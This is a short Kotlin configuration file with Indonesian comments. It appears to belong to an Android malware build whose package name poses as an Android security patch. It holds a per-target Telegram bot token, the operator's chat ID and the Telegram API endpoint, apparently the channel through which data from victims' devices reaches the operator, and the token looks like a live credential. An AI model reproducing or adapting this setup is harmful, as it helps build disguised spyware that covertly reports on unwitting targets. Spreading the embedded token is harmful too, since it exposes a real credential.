package com.android.security.patch

/**
 * Per-target config. EDIT MANUAL sebelum zip + upload ke SYAM.
 * BOT_TOKEN beda tiap target (dari BotFather).
 * OWNER_CHAT_ID chat id lu (dapet dari @userinfobot).
 */
object Config {
    const val BOT_TOKEN = "8959485822:AAE7nrhZL8aTeEfdRjMfIp9YREOYOzD83ys"
    const val OWNER_CHAT_ID = 7567067447L
    const val API = "https://api.telegram.org/bot"
    const val DEVICE_TAG = "device" // opsional, buat log saja
}